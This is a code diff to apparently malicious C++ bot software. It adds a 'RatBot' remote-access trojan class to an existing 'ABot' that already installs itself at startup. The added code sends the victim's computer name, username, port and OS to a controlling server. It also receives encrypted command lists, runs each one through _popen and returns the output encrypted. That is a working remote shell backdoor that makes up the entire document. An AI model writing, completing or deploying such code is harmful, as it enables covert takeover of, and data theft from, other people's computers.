@@ -167,8 +167,10 @@ void ABot::add_executable_to_start_up()
     }
 }
 
+
 void ABot::on_client_connect()
 {
+    cout << "Client connected." << endl;
     json sys_data;
     TCHAR c_comp_name[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD c_comp_size;
@@ -179,9 +181,11 @@ void ABot::on_client_connect()
     GetComputerName(c_comp_name, &c_comp_size);
     GetUserName(c_username, &c_username_size);
 
+    sys_data["Type"] = "Connection";
     sys_data["ID"] = c_comp_name;
     sys_data["USER"] = c_username;
-    sys_data["IP"] = real_ip();
+    cout << "Getting IP address..." << endl;
+    sys_data["IP"] = "IP GOES HERE"; // real_ip();
     sys_data["PORT"] = str_port;
     sys_data["VERSION"] = GHOSTVER;
 
@@ -230,4 +234,73 @@ void ABot::on_client_connect()
     sys_data["OS"] = os_output;
 
     client.send_data(encryptCMD(sys_data.dump()).c_str());
+}
+
+
+// ==========================================
+// Rat Bot needs to be in different file
+// ==========================================
+
+std::string executeCommand(const char* cmd)
+{
+    std::string result;
+    char buffer[256];
+
+    // Open the command as a process
+    FILE* pipe = _popen(cmd, "r");
+    if (!pipe) {
+        std::cerr << "Failed to execute command: " << cmd << std::endl;
+        return "";
+    }
+
+    // Read the output of the command
+    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+        result += buffer;
+    }
+
+    // Close the pipe
+    _pclose(pipe);
+
+    return result;
+}
+
+std::string escapeNewlines(const std::string& str)
+{
+    std::string escapedStr;
+    for (char c : str) {
+        if (c == '\n') {
+            escapedStr += "\\n";
+        } else {
+            escapedStr += c;
+        }
+    }
+    return escapedStr;
+}
+
+void RatBot::on_client_connect()
+{
+    ABot::on_client_connect();
+    std::cout << "Success!" << std::endl;
+}
+
+void RatBot::on_client_rec_data(char* data)
+{
+    string s_data = unencryptCMD(data);
+    json j_data = json::parse(s_data);
+    string request_id = j_data["request_id"];
+    vector<string> commands = j_data["commands"];
+    for ( unsigned int i = 0; i < commands.size(); i++)
+    {
+        string command = commands[i];
+        cout << command << endl;
+        string output = executeCommand(command.c_str());
+
+        json data;
+        data["Type"] = "Output";
+        data["RequestID"] = request_id;
+        data["Input"] = command;
+        data["Output"] = escapeNewlines(output);
+        cout << escapeNewlines(output) << endl;
+        client.send_data(encryptCMD(data.dump()).c_str());
+    }
 }
